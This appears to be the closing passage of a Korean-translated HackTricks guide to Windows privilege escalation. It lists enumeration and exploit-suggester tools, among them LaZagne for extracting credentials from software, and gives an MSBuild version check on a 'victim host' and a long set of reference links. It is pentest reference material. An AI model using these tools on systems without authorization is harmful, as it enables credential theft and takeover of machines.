[**Watson**](https://github.com/rasta-mouse/Watson) -- 알려진 privesc vulnerabilities를 검색합니다 (VisualStudio를 사용해 컴파일해야 함) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations를 찾기 위해 host를 열거합니다 (privesc 도구라기보다 정보 수집 도구에 더 가깝습니다) (컴파일 필요) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- 많은 software에서 credentials를 추출합니다 (github에 precompiled exe 있음)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp의 C# 포트**\
[~~**Beroot**~~](https://github.com/AlessandroZ/BeRoot) **~~**~~ -- misconfiguration을 확인합니다 (github에 precompiled executable 있음). 권장하지 않습니다. Win10에서 잘 동작하지 않습니다.\
[~~**Windows-Privesc-Check**~~](https://github.com/pentestmonkey/windows-privesc-check) -- 가능한 misconfigurations를 확인합니다 (python으로 만든 exe). 권장하지 않습니다. Win10에서 잘 동작하지 않습니다.

**Bat**

[**winPEASbat** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)-- 이 글을 기반으로 만든 tool입니다 (정상 동작에 accesschk가 필요하지 않지만 사용할 수는 있습니다).

**Local**

[**Windows-Exploit-Suggester**](https://github.com/GDSSecurity/Windows-Exploit-Suggester) -- **systeminfo** 출력 결과를 읽고 동작하는 exploit을 추천합니다 (local python)\
[**Windows Exploit Suggester Next Generation**](https://github.com/bitsadmin/wesng) -- **systeminfo** 출력 결과를 읽고 동작하는 exploit을 추천합니다 (local python)

**Meterpreter**

_multi/recon/local_exploit_suggestor_

올바른 버전의 .NET을 사용해 project를 컴파일해야 합니다([이것을 보세요](https://rastamouse.me/2018/09/a-lesson-in-.net-framework-versions/)). 피해자 host에 설치된 .NET 버전을 보려면 다음을 수행할 수 있습니다:
```
C:\Windows\microsoft.net\framework\v4.0.30319\MSBuild.exe -version #Compile the code with the version given in "Build Engine version" line
```
## References

- [http://www.fuzzysecurity.com/tutorials/16.html](http://www.fuzzysecurity.com/tutorials/16.html)
- [http://www.greyhathacker.net/?p=738](http://www.greyhathacker.net/?p=738)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/sagishahar/lpeworkshop](https://github.com/sagishahar/lpeworkshop)
- [https://www.youtube.com/watch?v=_8xJaaQlpBo](https://www.youtube.com/watch?v=_8xJaaQlpBo)
- [https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/privilege_escalation_windows.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/](https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/)
- [https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md](https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/](https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/)
- [https://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalation)
- [http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html](http://it-ovid.blogspot.com/2012/02/windows-privilege-escalation.html)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#antivirus--detections)

- [0xdf – HTB/VulnLab JobTwo: Word VBA macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 to SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [HTB Reaper: Format-string leak + stack BOF → VirtualAlloc ROP (RCE) and kernel token theft](https://0xdf.gitlab.io/2025/08/26/htb-reaper.html)

- [Check Point Research – Chasing the Silver Fox: Cat & Mouse in Kernel Shadows](https://research.checkpoint.com/2025/silver-fox-apt-vulnerable-drivers/)
- [Unit 42 – Privileged File System Vulnerability Present in a SCADA System](https://unit42.paloaltonetworks.com/iconics-suite-cve-2025-0921/)
- [Symbolic Link Testing Tools – CreateSymlink usage](https://github.com/googleprojectzero/symboliclink-testing-tools/blob/main/CreateSymlink/CreateSymlink_readme.txt)
- [A Link to the Past. Abusing Symbolic Links on Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [RIP RegPwn – MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [RegPwn BOF (Cobalt Strike BOF port)](https://github.com/Flangvik/RegPwnBOF)
- [ZDI - Node.js Trust Falls: Dangerous Module Resolution on Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [Node.js modules: loading from `node_modules` folders](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)

{{#include ../../banners/hacktricks-training.md}}
